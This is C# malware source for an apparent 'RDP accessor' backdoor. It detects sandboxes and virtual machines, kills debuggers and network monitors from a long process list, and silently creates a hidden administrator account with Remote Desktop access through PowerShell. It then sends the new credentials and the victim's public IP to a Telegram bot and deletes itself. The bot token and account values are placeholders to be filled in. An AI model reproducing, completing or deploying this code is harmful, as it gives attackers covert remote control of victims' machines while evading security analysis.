using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;

namespace localhost
{
    internal static class Program
    {
        [STAThread]
        private static void Main()
        {
            CheckAnalysis(); // Check AnyRun or Virtual Machine 
            CheckProcesses(); // Check forbidden processes: debuggers, network monitors and etc. . .

            try
            {
                createAdminUser(); // Create admin user
                allowRemoteAccess(); // Allowed remote accesses
                SendMessage("Job's done!"); // null function
                autoSeflDel(); // auto-self delete function
            }
            catch 
            {
                autoSeflDel(); // Autoself delete
                return;
            }


        }


        private static void createAdminUser()
        {
            try
            {
                Program.AppendToSummary("Created Admin User");
                Program.RunPS($"net user {Program.newUserName} {Program.newUserPass} /add");
                Program.RunPS($"net localgroup administrators {Program.newUserName} /add");
            }
            catch (Exception)
            {
                // Ошибки не выводятся, вызывается selfRemove
                throw;
            }
        }

        private static void allowRemoteAccess()
        {
            try
            {
                Program.AppendToSummary("Allowed Remote Access");
                Program.RunPS($"net localgroup \"Remote Desktop Users\" {Program.newUserName} /add");
            }
            catch (Exception)
            {
                // Ошибки не выводятся, вызывается selfRemove
                throw;
            }
        }

        private static void AppendToSummary(string text)
        {
            Program.summaryMessage = Program.summaryMessage + text + Environment.NewLine;
        }

        private static void SendMessage(string text)
        {
            try
            {
                string ram = Program.GetRAM();
                string value = string.Concat(new string[]
                {
                    string.Concat(new string[]
                    {
                        "====[New Admin User Information]====",
                        Environment.NewLine,
                        Program.summaryMessage,
                        "[+]  Username => ",
                        Program.newUserName,
                        "\n[+]  Password => ",
                        Program.newUserPass,
                        "\n[+]  IP => ",
                        Program.Get("https://www.ifconfig.me/"),
                        "\n[+]  RAM => ",
                        ram,
                        "\n===[ ]===[ RDP ACCESSOR LOG ]===[ ]==="
                    })
                });
                using (WebClient webClient = new WebClient())
                {
                    ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                    webClient.DownloadString(string.Concat(new string[]
                    {
                        "https://api.telegram.org/bot",
                        Program.Token,
                        "/sendMessage?chat_id=",
                        Program.ID,
                        "&text=",
                        WebUtility.UrlEncode(value)
                    }));
                }
            }
            catch (Exception)
            {
                // Ошибки не выводятся, вызывается selfRemove
                throw;
            }
        }

        public static bool CheckProcesses()
        {
            string[] forbiddenProcesses = {
                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
                "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
                "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
                "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
                "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
                "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
                "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
                "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
                "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
                "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", "ProcessHacker",
            };
            var processes = Process.GetProcesses();

            foreach (var processName in forbiddenProcesses)
            {
                foreach (var process in processes)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        try
                        {
                            process.Kill();
                            process.Dispose();
                        }
                        catch{}


                        return true;
                    }
                }
            }

            return false;
        }

        private static bool AnyRunDtc()
        {
            string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk", "Skype.lnk", "Microsoft Edge.lnk" };

            foreach (string fileName in array)
            {
                if (!File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)))
                {
                    return false; 
                }
            }

            // Проверка на имя пользователя и имя машины
            if (string.Equals(Environment.UserName.ToLower(), "admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC"))
            {
                autoSeflDel();
            }

            return false;
        }


        private static bool AntiVM_Checker()
        {
            string[] vmProcesses = {
        "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
        "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
        "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService",
        "VBoxTray",
    };

            var processes = Process.GetProcesses();

            foreach (var process in processes)
            {
                foreach (var processName in vmProcesses)
                {
                    if (process.ProcessName.ToLower() == processName.ToLower())
                    {
                        autoSeflDel();
                    }
                }
            }

            return false;
        }



        private static void CheckAnalysis()
        {
            AntiVM_Checker();
            AnyRunDtc();
        }
        

        private static void RunPS(string args)
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            process.Start();
            process.WaitForExit();
        }

        private static string GetRAM()
        {
            try
            {
                int num = 0;
                using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                {
                    using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
                    {
                        if (enumerator.MoveNext())
                        {
                            ManagementObject managementObject = (ManagementObject)enumerator.Current;
                            double num2 = Convert.ToDouble(managementObject["TotalPhysicalMemory"]);
                            num = (int)(num2 / 1048576.0) - 1;
                        }
                    }
                }
                return num.ToString("#,GB");
            }
            catch (Exception)
            {
                // Ошибки не выводятся, вызывается selfRemove
                throw;
            }
        }

        private static string Get(string uri)
        {
            HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(uri);
            httpWebRequest.AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate);
            string result;
            using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
            {
                using (Stream responseStream = httpWebResponse.GetResponseStream())
                {
                    using (StreamReader streamReader = new StreamReader(responseStream))
                    {
                        result = streamReader.ReadToEnd();
                    }
                }
            }
            return result;
        }


        private static void autoSeflDel()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            selfRemove(fileName, 1);
        }

        private static void selfRemove(string fileName, int delaySecond = 2)
        {
            fileName = Path.GetFullPath(fileName);
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = $"/c timeout /t {delaySecond} && DEL /f {currentProcessFileName} ";

            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
        }

        public static string Token = "TOKENBOT";
        public static string ID = "CHATIDUSER";
        public static string newUserName = "RDPUSERNAME";
        public static string newUserPass = "RDPPASSWORD";
        public static string summaryMessage = "";
    }
}
